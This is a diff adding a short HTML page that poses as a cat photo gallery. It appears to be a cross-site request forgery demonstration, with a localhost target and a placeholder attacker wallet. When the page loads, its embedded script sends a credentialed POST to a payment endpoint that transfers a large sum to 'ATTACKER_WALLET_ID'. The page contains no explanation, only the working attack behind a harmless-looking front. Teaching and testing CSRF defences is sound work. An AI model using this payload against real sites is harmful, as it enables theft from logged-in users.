@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Cute Cats</title>
+</head>
+<body>
+  <h1>Cute Cat Photos</h1>
+
+  <img src="https://filmdaily.co/wp-content/uploads/2020/04/cute-cat-videos-lede-1300x882.jpg" width="25%"/>
+
+  <h3>While you were watching this photo an attacker steal your money</h3>
+
+  <script>
+    const endpointUrl = "https://localhost:8443/payment?to=ATTACKER_WALLET_ID&amount=2000000000";
+
+    fetch(endpointUrl, { method: "POST", credentials: "include" })
+      .then(res => {
+        if (res.status < 200 || res.status > 299) {
+          throw new Error("Request failed");
+        }
+      })
+      .then(() => console.log("Request executed successfully"))
+      .catch(() => console.log("Could not execute the request"));
+  </script>
+</body>
+</html>
